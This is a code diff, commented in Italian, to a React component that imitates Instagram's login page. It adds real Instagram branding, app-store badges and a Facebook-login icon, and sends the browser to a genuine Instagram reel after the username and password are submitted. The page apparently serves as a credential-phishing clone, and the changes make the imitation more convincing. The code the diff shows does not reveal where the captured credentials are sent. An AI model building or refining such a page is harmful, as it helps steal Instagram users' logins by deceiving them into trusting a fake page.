@@ -1,6 +1,29 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 
+// Importa le immagini
+import instagramLogo from '../assets/images/instagram-logo.png';
+import appStoreBadge from '../assets/images/app-store-badge.png';
+import googlePlayBadge from '../assets/images/google-play-badge.png';
+// Se hai una versione del logo per il tema scuro, importala così
+import instagramLogoDark from '../assets/images/instagram-logo-dark.png'; // Se disponibile
+
+// Componente per l'icona di Facebook
+const FacebookIcon = ({ darkMode }) => {
+  return (
+    <svg 
+      xmlns="http://www.w3.org/2000/svg" 
+      viewBox="0 0 16 16" 
+      width="16" 
+      height="16" 
+      className="facebook-svg-icon"
+    >
+      <rect width="16" height="16" rx="2" fill={darkMode ? "#4395f6" : "#385185"}/>
+      <path d="M11.1 16V9.8h2.1l.3-2.4h-2.4V5.8c0-.7.2-1.2 1.2-1.2h1.3V2.4c-.6-.1-1.3-.1-1.9-.1-1.9 0-3.2 1.2-3.2 3.3v1.8H6.4v2.4h2.1V16h2.6z" fill="#ffffff"/>
+    </svg>
+  );
+};
+
 const InstagramLogin = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -42,7 +65,7 @@ const InstagramLogin = () => {
       });
       
       // Redirect all'URL del reels che fornirai
-      window.location.href = 'https://www.instagram.com/reels/your-reels-id-here/';
+      window.location.href = 'https://www.instagram.com/reel/DBizR1Wti2p/';
       
     } catch (err) {
       setError('Si è verificato un problema durante l\'accesso. Riprova più tardi.');
@@ -67,7 +90,8 @@ const InstagramLogin = () => {
         <div className="form-container">
           <div className="logo-container">
             <img 
-              src={darkMode ? "/api/placeholder/175/51" : "/api/placeholder/175/51"} 
+              // Usa il logo appropriato in base al tema
+              src={darkMode && instagramLogoDark ? instagramLogoDark : instagramLogo} 
               alt="Instagram" 
               className="instagram-logo" 
             />
@@ -110,7 +134,8 @@ const InstagramLogin = () => {
           </div>
           
           <div className="facebook-login">
-            <span className="facebook-icon"></span>
+            {/* Utilizziamo qui l'icona SVG di Facebook */}
+            <FacebookIcon darkMode={darkMode} />
             <span>Accedi con Facebook</span>
           </div>
           
@@ -132,14 +157,14 @@ const InstagramLogin = () => {
           <div className="app-links">
             <a href="#" className="app-link">
               <img 
-                src="/api/placeholder/136/40" 
+                src={appStoreBadge}
                 alt="App Store" 
                 className="app-store" 
               />
             </a>
             <a href="#" className="app-link">
               <img 
-                src="/api/placeholder/136/40" 
+                src={googlePlayBadge}
                 alt="Google Play" 
                 className="google-play" 
               />
